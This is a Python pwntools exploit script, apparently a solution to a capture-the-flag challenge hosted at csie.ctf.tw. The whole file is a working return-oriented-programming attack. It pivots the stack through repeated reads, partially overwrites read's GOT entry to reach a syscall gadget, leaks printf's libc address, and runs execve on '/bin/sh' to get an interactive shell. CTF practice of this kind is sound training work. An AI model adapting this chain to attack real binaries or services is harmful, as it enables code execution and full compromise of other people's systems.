import pwn
import pwnlib
from pwn import pack
import time

pwn.context.arch = 'amd64'
buf1_address = 0x601000 + 0x120
buf2_address = 0x601000 + 0x220
buf3_address = 0x601000 + 0x620

read_plt_address = 0x4004c0
read_got_address = 0x601020
printf_plt_address = 0x4004b0
printf_got_address = 0x601018
start_address = 0x400500

def partial_got_overwrite(nbytes):
    c = ''
    c += pack(0x00000000004006ab) # pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    c += pack(1) # rbp = 1
    c += pack(read_got_address) # r12
    c += pack(nbytes) # edx
    c += pack(read_got_address) # rsi, buf*
    c += pack(0) # edi, fildes
    c += pack(0x00000000004006b3) # pop rdi ; ret
    c += pack(0) # rdi = 0
    c += pack(0x0000000000400686)   # xor ebx, ebx
                                    # nop dword[rax + rax]
                                    # mov rdx, r13
                                    # mov rsi, r14
                                    # mov edi, r15d
                                    # call qword[r12 + rbx*8] # push rip+8
    # add rsp, 8
    c += pack(0)
    # pop rbx, rbp, r12, r13, r14, r15
    c += pack(0)
    c += pack(buf2_address-0x20+8) # rbp = buf2_address-0x20+8
    c += pack(0)
    c += pack(nbytes)
    c += pack(read_got_address)
    c += pack(0)
    # rtn
    return c

def leak_printf():
    c = ''
    # rax == 1 already
    # sys_write( 1, printf@got, 20)
    c += pack(0x00000000004006ab) # pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    c += pack(1) # rbp = 1
    c += pack(read_got_address) # r12, syscall
    c += pack(59) # edx, 59 for sys_execve
    c += pack(printf_got_address) # rsi, buf*
    c += pack(1) # edi, fildes, stdout
    c += pack(0x00000000004006b3) # pop rdi ; ret
    c += pack(1) # rdi = stdout
    c += pack(0x0000000000400686)   # xor ebx, ebx
                                    # nop dword[rax + rax]
                                    # mov rdx, r13
                                    # mov rsi, r14
                                    # mov edi, r15d
                                    # call qword[r12 + rbx*8] # push rip+8
    # add rsp, 8
    c += pack(0)
    # pop rbx, rbp, r12, r13, r14, r15
    c += pack(0)
    c += pack(buf2_address-0x20+8) # rbp = buf2_address-0x20+8
    c += pack(0)
    c += pack(0)
    c += pack(0)
    c += pack(0)
    return c

def execve_binsh():
    c = ''
    # eax == 59
    c += pack(0x00000000004006ab) # pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    c += pack(1) # rbp = 1
    c += pack(read_got_address) # r12, syscall
    c += pack(0) # rdx, envp
    c += pack(0) # rsi, argv
    c += pack(buf1_address-0x20) # edi, filename*
    c += pack(0x00000000004006b3) # pop rdi ; ret
    c += pack(buf1_address-0x20) # rdi = stdout
    c += pack(0x0000000000400686)   # xor ebx, ebx
                                    # nop dword[rax + rax]
                                    # mov rdx, r13
                                    # mov rsi, r14
                                    # mov edi, r15d
                                    # call qword[r12 + rbx*8] # push rip+8
    # add rsp, 8
    c += pack(0)
    # pop rbx, rbp, r12, r13, r14, r15
    c += pack(0)
    c += pack(buf2_address-0x20+8) # rbp = buf2_address-0x20+8
    c += pack(0)
    c += pack(0)
    c += pack(0)
    c += pack(0)
    return c

def final_chain():
    c = ''
    c += pack(buf2_address-0x20+8) # rbp = buf2_address-0x20+8
    c += partial_got_overwrite(1)
    # read == syscall
    c += leak_printf()
    c += execve_binsh()

    for i in range(30):
        c += pack(0x0000000000400499) # ret
    return c

def main_chain(rbp_address, payload, leave=False):
    c = payload
    c += pack(rbp_address) # rbp = rbp_address
    if leave:
        c += pack(0x0000000000400646) # leave; ret
    else:
        c += pack(0x40062b) # read(0, rbp-0x20, 0x30)

    return c

if __name__ == '__main__':
    if pwnlib.args.args['REMOTE']:
        p = pwn.connect('csie.ctf.tw', 10135)
    else:
        p = pwn.process('./readme-fc826c708f619e14b137630581b766b23e3db765')

    libc = pwn.ELF('./libc.so.6-14c22be9aa11316f89909e4237314e009da38883')
    fc = final_chain()
    print p.recvuntil(':') # read your input:
    p.send(main_chain(buf1_address, 'x'*0x20))

    for i in range(len(fc)//0x20):
        p.send(main_chain(buf2_address+0x20*i, fc[i*0x20:(i+1)*0x20]))
        time.sleep(0.01)
        p.send(main_chain(buf1_address, fc[i*0x20:(i+1)*0x20]))

    p.send(main_chain(buf2_address-0x20, '/bin/sh\x00'.ljust(0x20), leave=True))
    time.sleep(0.5)
    p.send('\x2E') # partial_got_overwrite
    leak_printf_got = pwn.u64(p.recv(0x8))
    p.recv(59-0x8)

    # calculate libc base
    libc_base = leak_printf_got - libc.symbols['printf']

    # pwn.gdb.attach(p, gdbscript='x/xg 0x601020')
    p.interactive()
    print p.recvall()
